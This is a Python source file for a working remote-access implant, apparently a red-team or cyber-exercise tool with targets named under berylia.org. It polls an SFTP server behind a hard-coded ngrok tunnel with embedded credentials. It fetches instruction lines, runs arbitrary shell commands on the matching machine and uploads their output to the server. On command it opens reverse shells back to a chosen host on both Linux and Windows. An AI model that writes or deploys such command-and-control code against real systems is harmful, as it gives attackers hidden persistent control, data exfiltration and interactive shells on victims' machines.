#!/usr/bin/env python3

import socket
import random
import time
import subprocess
import pysftp
import tempfile
import os
import uuid

SFTP_IP = '0.tcp.eu.ngrok.io'
SFTP_PORT = 18626
SFTP_USER = 'sftp_user'
SFTP_PASS = 'P@ssw0rd'

# Instruction line format: target|command|args
#   * target: all or FQDN of machine
#   * command:
#       * cmd: run command with specified command
#       * cmd_put: run command with specified command, store output into file and put it in sftp server
#       * shell: reverse shell back to specified host and port
#   * args:
#       * if command is cmd, write command itself: echo 'hello world' >> /tmp/test
#       * if command is shell, write "host,port" to connect back to: 192.168.1.25,5555

# Example:
# all|cmd|echo 'hello world' >> /tmp/test
# www.bob.06.berylia.org|shell|192.168.1.25,5555
# www.bob.06.berylia.org|cmd|echo 'hello world' >> /tmp/test
# www.bob.06.berylia.org|cmd_put|echo 'hello world'
# www.bob.07.berylia.org|cmd_put|echo 'hello world'
# www.bob.08.berylia.org|cmd_put|echo 'hello world'
# www.bob.06.berylia.org|cmd_put|echo 'hello world'
# www.bob.06.berylia.org|cmd_put|echo 'hello world'
# www.bob.06.berylia.org|cmd_put|echo 'hello world'

cnopts = pysftp.CnOpts()
cnopts.hostkeys = None # type: ignore

def sftpConnect(ip, port, user, pwd):
    c2outfile = os.path.join(tempfile.gettempdir(), str(uuid.uuid4()) + '.tmp')
    with pysftp.Connection(ip, port=port, username=user, password=pwd, cnopts=cnopts) as sftp:
        with sftp.cd('sftp_user'):
            sftp.get('instructions', c2outfile)
            print('Retrieved instructions')
    with open(c2outfile, 'r') as f:
        for line in f:
            print(line)
            if not line: continue
            splitted = line.split('|', 2)
            target = splitted[0].lower()
            command = splitted[1]
            args = splitted[2]

            if target != 'all' and target != socket.getfqdn().lower():
                print('Skipping, fqdn is ' + socket.getfqdn().lower())
                continue # this instruction line is not for target

            if command == 'shell':
                print('Launching shell')
                rs_ip, rs_port = args.split(',')
                if os.name == 'nt':
                    windowsReverseShell(rs_ip, int(rs_port))
                elif os.name == 'posix':
                    linuxReverseShell(rs_ip, int(rs_port))
                

            elif command.startswith('cmd'):
                print('Launching cmd')
                stdout, stderr = runCmd(args)

                if command == 'cmd_put':
                    outputfile = os.path.join(tempfile.gettempdir(), str(uuid.uuid4()) + '.tmp')
                    with open(outputfile, 'wb') as outfile:
                        outfile.write(b'== STDOUT ==\n')
                        outfile.write(stdout)
                        outfile.write(b'== STDERR ==\n')
                        outfile.write(stderr)
                    with pysftp.Connection(ip, port=port, username=user, password=pwd, cnopts=cnopts) as sftp:
                        with sftp.cd('sftp_user/out'):
                            sftp.put(outputfile, socket.getfqdn().lower() + '.txt')
                            print('Placed output')
                    os.remove(outputfile)
    os.remove(c2outfile)


def linuxReverseShell(ip, port):
    try:
        print('Connecting...')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        print('Connected!')
        subprocess.call(["/bin/bash", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
    except ConnectionRefusedError:
        print('Failed.')


def windowsReverseShell(ip, port):
    try:
        print('Connecting...')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        print('Connected!')

        while 1:
            try:
                s.send(str.encode(os.getcwd() + "> "))
                data = s.recv(1024).decode("UTF-8")
                data = data.strip('\n')
                if data == "quit" or data == "exit": 
                    break
                if data[:2] == "cd":
                    os.chdir(data[3:])
                if len(data) > 0:
                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
                    stdout_value = proc.stdout.read() + proc.stderr.read()
                    output_str = str(stdout_value, "UTF-8")
                    s.send(str.encode("\n" + output_str))
            except Exception as e:
                continue
    except ConnectionRefusedError:
        print('Failed.')


def runCmd(cmd):
    proc = subprocess.run(cmd, shell=True, capture_output=True)
    return (proc.stdout, proc.stderr)


def main():
    while True:
        sftpConnect(SFTP_IP, SFTP_PORT, SFTP_USER, SFTP_PASS)
        time.sleep(random.randint(60 * 10, 60 * 20)) # 10 - 20min


if __name__ == '__main__':
    main()
